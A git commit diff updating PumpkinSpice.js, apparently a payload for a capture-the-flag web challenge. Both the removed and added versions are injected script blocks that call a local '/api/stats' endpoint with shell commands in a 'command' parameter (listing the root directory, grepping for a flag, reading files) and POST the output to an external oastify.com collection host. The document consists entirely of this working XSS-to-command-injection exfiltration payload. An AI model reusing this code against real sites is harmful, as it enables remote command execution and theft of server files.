0083961e441509f733d8754ca52466ddf0ca1348
jellyf15h <86880362+jellyf15h@users.noreply.github.com>
2024-05-15 17:04:04 -0700

    Update PumpkinSpice.js

--- PumpkinSpice.js
+++ PumpkinSpice.js
@@ -1,24 +1,14 @@
 <script>
-fetch("http://127.0.0.1:1337/api/stats?command=ls+/|grep+flag")
-  .then((response) => response.text())
-  .then((data) => { 
-    fetch(`http://127.0.0.1:1337/api/stats?command=cat+/`+data)
-      .then((response) => response.text())
-      .then((fileContent) => {
-        fetch('http://xklqf2ly81rowgujq4vgur2vcmid66uv.oastify.com', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ fileContent }),
-          mode: 'cors',
-          credentials: 'omit'
-        });
-      })
-      .catch((error) => {
-        console.error('Error fetching file content:', error);
-      });
-  })
-  .catch((error) => {
-    console.error('Error fetching stats:', error);
-  });</script>
+fetch("http://127.0.0.1:1337/api/stats?command=ls").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://rhckcwis5voitardnysarlzp9gf733rs.oastify.com/submit", {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST",
+        "mode": "cors",
+        "credentials": "omit"
+    });
+});</script>
